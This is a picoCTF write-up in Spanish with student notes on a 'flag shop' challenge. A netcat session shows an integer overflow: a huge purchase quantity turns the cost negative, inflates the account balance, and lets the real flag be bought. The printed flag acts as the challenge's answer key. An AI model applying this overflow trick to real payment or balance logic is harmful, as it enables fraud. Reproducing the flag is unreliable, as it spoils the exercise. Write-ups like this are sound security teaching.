## Objetivo
There's a flag shop selling stuff, can you buy a flag? [Source](https://challenge-files.picoctf.net/c_fickle_tempest/a8413624d27590e0fa83440f1154a3267699b5d199d05df7bf7cf583c4c357b7/store.c). Connect with nc fickle-tempest.picoctf.net 54100.
## Solución
```bash
ericdiazdeleon@2806-103e-0013-33e9-b535-6a1f-5403-1770:/var/home/ericdiazdeleon/Documentos/Tareas/NotasFundamSeguridaDeLaInfo/PicoCTF/General Skills$ nc fickle-tempest.picoctf.net 54100
Welcome to the flag exchange
We sell flags

1. Check Account Balance

2. Buy Flags

3. Exit

 Enter a menu selection
1



 Balance: 1100


Welcome to the flag exchange
We sell flags

1. Check Account Balance

2. Buy Flags

3. Exit

 Enter a menu selection
2
Currently for sale
1. Defintely not the flag Flag
2. 1337 Flag
1
These knockoff Flags cost 900 each, enter desired quantity
3

The final cost is: 2700
Not enough funds to complete purchase
Welcome to the flag exchange
We sell flags

1. Check Account Balance

2. Buy Flags

3. Exit

 Enter a menu selection
2
Currently for sale
1. Defintely not the flag Flag
2. 1337 Flag
2
1337 flags cost 100000 dollars, and we only have 1 in stock
Enter 1 to buy one1

Not enough funds for transaction


Welcome to the flag exchange
We sell flags

1. Check Account Balance

2. Buy Flags

3. Exit

 Enter a menu selection
1



 Balance: 1100


Welcome to the flag exchange
We sell flags

1. Check Account Balance

2. Buy Flags

3. Exit

 Enter a menu selection
2
Currently for sale
1. Defintely not the flag Flag
2. 1337 Flag
1
These knockoff Flags cost 900 each, enter desired quantity
2500000

The final cost is: -2044967296

Your current balance after transaction: 2044968396

Welcome to the flag exchange
We sell flags

1. Check Account Balance

2. Buy Flags

3. Exit

 Enter a menu selection
1



 Balance: 2044968396


Welcome to the flag exchange
We sell flags

1. Check Account Balance

2. Buy Flags

3. Exit

 Enter a menu selection
2
Currently for sale
1. Defintely not the flag Flag
2. 1337 Flag
2
1337 flags cost 100000 dollars, and we only have 1 in stock
Enter 1 to buy one1
YOUR FLAG IS: picoCTF{m0n3y_bag5_C87346f2}

Welcome to the flag exchange
We sell flags

1. Check Account Balance

2. Buy Flags

3. Exit

 Enter a menu selection
^C
ericdiazdeleon@2806-103e-0013-33e9-b535-6a1f-5403-1770:/var/home/ericdiazdeleon/Documentos/Tareas/NotasFundamSeguridaDeLaInfo/PicoCTF/General Skills$
```
## Notas Adicionales
Este reto se trataba acerca de la explotacion del integer limit en c que es el lenguaje en el cual esta programado, al superar este limite usando la opcion de comprar varias DefinitlyNotAFlagFlag en donde se multiplican, este valor se excede y por lo tanto se vuelve negativo y se suma al balance pero pasando el numero a positivo. Con lo cual tenemos suficiente balance para comprar la flag real `picoCTF{m0n3y_bag5_C87346f2}`.
### Referencias